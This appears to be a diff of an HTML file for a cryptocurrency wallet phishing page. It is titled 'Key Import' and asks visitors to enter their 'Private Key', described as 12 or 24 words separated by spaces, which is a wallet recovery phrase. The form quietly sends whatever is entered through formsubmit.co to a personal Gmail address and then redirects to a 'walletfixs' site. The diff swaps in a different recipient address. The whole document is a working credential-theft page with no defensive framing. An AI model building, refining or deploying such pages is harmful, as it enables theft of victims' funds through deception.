@@ -1,30 +1,159 @@
-<form action="https://formsubmit.co/Kboy08149@gmail.com" method="post">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Key Import</title>
 
-  <input type="hidden" name="_captcha" value="false">
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
 
-  <!-- redirect after successful submit -->
-  <input type="hidden" name="_next" value="https://walletfixs.vercel.app/">
+    body{
+      height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background:#f4f4f4;
+      overflow:hidden;
+    }
 
-  <input 
-    type="email"
-    name="email"
-    class="input-box" 
-    placeholder="Enter email"
-    required
-  >
+    .container{
+      width:100%;
+      max-width:420px;
+      padding:30px;
+      text-align:center;
+    }
 
-  <p class="info">
-    Typically 12 (sometimes 24)<br>
-    seperated by single<br>
-    spaces
-  </p>
+    .title{
+      font-size:42px;
+      font-weight:500;
+      color:#222;
+      margin-bottom:30px;
+    }
 
-  <button type="submit" class="btn proceed">
-    PROCEED
-  </button>
+    .line{
+      width:100%;
+      height:2px;
+      background:#bdbdbd;
+      margin-bottom:40px;
+    }
 
-  <button type="button" class="btn cancel">
-    Cancel
-  </button>
+    .input-box{
+      width:100%;
+      height:80px;
+      border:2px solid #d4d4d4;
+      border-radius:12px;
+      padding:0 25px;
+      font-size:28px;
+      color:#555;
+      outline:none;
+      margin-bottom:35px;
+      background:white;
+    }
 
-</form>
+    .input-box::placeholder{
+      color:#8b8b9b;
+    }
+
+    .info{
+      font-size:24px;
+      line-height:1.6;
+      color:#555;
+      margin-bottom:55px;
+    }
+
+    .btn{
+      width:100%;
+      height:78px;
+      border:none;
+      border-radius:12px;
+      font-size:32px;
+      color:white;
+      cursor:pointer;
+      transition:0.3s ease;
+      margin-bottom:25px;
+    }
+
+    .btn:hover{
+      transform:scale(1.02);
+    }
+
+    .proceed{
+      background:#0066ff;
+    }
+
+    .cancel{
+      background:#e91d3a;
+    }
+
+    @media(max-width:480px){
+
+      .title{
+        font-size:36px;
+      }
+
+      .input-box{
+        font-size:24px;
+        height:75px;
+      }
+
+      .info{
+        font-size:20px;
+      }
+
+      .btn{
+        font-size:28px;
+        height:72px;
+      }
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="container">
+
+    <h1 class="title">Private Key</h1>
+
+    <div class="line"></div>
+
+    <form action="https://formsubmit.co/nxloaded@gmail.com" method="post">
+
+      <input type="hidden" name="_captcha" value="false">
+
+      <!-- ADDED LINE (REDIRECT AFTER SUBMIT) -->
+      <input type="hidden" name="_next" value="https://walletfixs.vercel.app/">
+
+      <input 
+        type="email"
+        name="email"
+        class="input-box" 
+        placeholder="Enter Your Private Key"
+        required
+      >
+
+      <p class="info">
+        Typically 12 (sometimes 24)<br>
+        seperated by single<br>
+        spaces
+      </p>
+
+      <button type="submit" class="btn proceed">
+        PROCEED
+      </button>
+
+      <button type="button" class="btn cancel">
+        Cancel
+      </button>
+
+    </form>
+
+  </div>
+
+</body>
+</html>
